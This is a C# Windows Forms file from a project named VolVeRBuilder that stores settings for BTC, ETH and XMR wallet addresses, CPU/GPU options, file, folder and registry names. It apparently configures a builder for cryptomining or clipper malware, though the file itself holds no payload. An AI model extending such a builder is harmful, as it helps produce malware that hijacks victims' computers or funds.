using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace VolVeRBuilder.Forms.Build
{
    public partial class Misc : Form
    {
        public Misc()
        {
            InitializeComponent();
        }
        private void textBox1_Leave(object sender, EventArgs e)
        {
            if (textBox10.Text.Length == 0)
            {
                textBox10.Text = "File Name";
                textBox10.ForeColor = SystemColors.GrayText;
            }
            if (textBox11.Text.Length == 0)
            {
                textBox11.Text = "Folder Name";
                textBox11.ForeColor = SystemColors.GrayText;
            }
            if (textBox12.Text.Length == 0)
            {
                textBox12.Text = "Register Name";
                textBox12.ForeColor = SystemColors.GrayText;
            }
            if (textBox3.Text.Length == 0)
            {
                textBox3.Text = "Your BTC Wallet Adderss";
                textBox3.ForeColor = SystemColors.GrayText;
            }
            if (textBox2.Text.Length == 0)
            {
                textBox2.Text = "Your ETH Wallet Adderss";
                textBox2.ForeColor = SystemColors.GrayText;
            }
            if (textBox1.Text.Length == 0)
            {
                textBox1.Text = "Your XMR Wallet Adderss";
                textBox1.ForeColor = SystemColors.GrayText;
            }
        }


        private void Misc_Load(object sender, EventArgs e)
        {
            textBox1.Text = Properties.Settings.Default.Misc1;
            textBox2.Text = Properties.Settings.Default.Misc2;
            textBox3.Text = Properties.Settings.Default.Misc3;
            textBox4.Text = Properties.Settings.Default.Misc4;
            textBox10.Text = Properties.Settings.Default.Misc5;
            textBox11.Text = Properties.Settings.Default.Misc6;
            textBox12.Text = Properties.Settings.Default.Misc7;
            comboBox1.Text = Properties.Settings.Default.CPU;
            comboBox2.Text = Properties.Settings.Default.GPU;
            if (Properties.Settings.Default.ChekBox1 == "YES")
            {
                checkBox1.Checked = true;
            }
            if (Properties.Settings.Default.ChekBox2 == "YES")
            {
                checkBox2.Checked = true;
            }
            if (Properties.Settings.Default.ChekBox3 == "YES")
            {
                checkBox3.Checked = true;
            }
            if (Properties.Settings.Default.ChekBox4 == "YES")
            {
                checkBox4.Checked = true;
            }
            if (Properties.Settings.Default.ChekBox5 == "YES")
            {
                checkBox5.Checked = true;
            }
            if (Properties.Settings.Default.ChekBox6 == "YES")
            {
                checkBox6.Checked = true;
            }
            if (Properties.Settings.Default.ChekBox7 == "YES")
            {
                checkBox7.Checked = true;
            }
            this.textBox10.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox11.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox12.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox3.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox2.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox1.Leave += new System.EventHandler(this.textBox1_Leave);
            if (textBox10.Text.Length == 0)
            {
                textBox10.Text = "File Name";
                textBox10.ForeColor = Color.Gray;
            }
            if (textBox11.Text.Length == 0)
            {
                textBox11.Text = "Folder Name";
                textBox11.ForeColor = Color.Gray;
            }
            if (textBox12.Text.Length == 0)
            {
                textBox12.Text = "Register Name";
                textBox12.ForeColor = Color.Gray;
            }
            if (textBox3.Text.Length == 0)
            {
                textBox3.Text = "Your BTC Wallet Adderss";
                textBox3.ForeColor = Color.Gray;
            }
            if (textBox2.Text.Length == 0)
            {
                textBox2.Text = "Your ETH Wallet Adderss";
                textBox2.ForeColor = Color.Gray;
            }
            if (textBox1.Text.Length == 0)
            {
                textBox1.Text = "Your XMR Wallet Adderss";
                textBox1.ForeColor = Color.Gray;
            }
        }


        private void FormIsClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.Misc1 = textBox1.Text;
            Properties.Settings.Default.Misc2 = textBox2.Text;
            Properties.Settings.Default.Misc3 = textBox3.Text;
            Properties.Settings.Default.Misc4 = textBox4.Text;
            Properties.Settings.Default.Misc5 = textBox10.Text;
            Properties.Settings.Default.Misc6 = textBox11.Text;
            Properties.Settings.Default.Misc7 = textBox12.Text;
            Properties.Settings.Default.CPU = comboBox1.Text;
            Properties.Settings.Default.GPU = comboBox2.Text;
            if (checkBox1.Checked == true)
            {
                Properties.Settings.Default.ChekBox1 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox1 = "NO";
            }
            if (checkBox2.Checked == true)
            {
                Properties.Settings.Default.ChekBox2 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox2 = "NO";
            }
            if (checkBox3.Checked == true)
            {
                Properties.Settings.Default.ChekBox3 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox3 = "NO";
            }
            if (checkBox4.Checked == true)
            {
                Properties.Settings.Default.ChekBox4 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox4 = "NO";
            }
            if (checkBox5.Checked == true)
            {
                Properties.Settings.Default.ChekBox5 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox5 = "NO";
            }
            if (checkBox6.Checked == true)
            {
                Properties.Settings.Default.ChekBox6 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox6 = "NO";
            }
            if (checkBox7.Checked == true)
            {
                Properties.Settings.Default.ChekBox7 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox7 = "NO";
            }

            Properties.Settings.Default.Save();


        }
        static string RandomString(int size)
        {
            Random random = new Random((int)DateTime.Now.Ticks);
            StringBuilder builder = new StringBuilder();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }


        private void button2_Click(object sender, EventArgs e)
        {
            Random rnd = new Random();
            int random = rnd.Next(6, 20);
            textBox4.Text = RandomString(random);
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
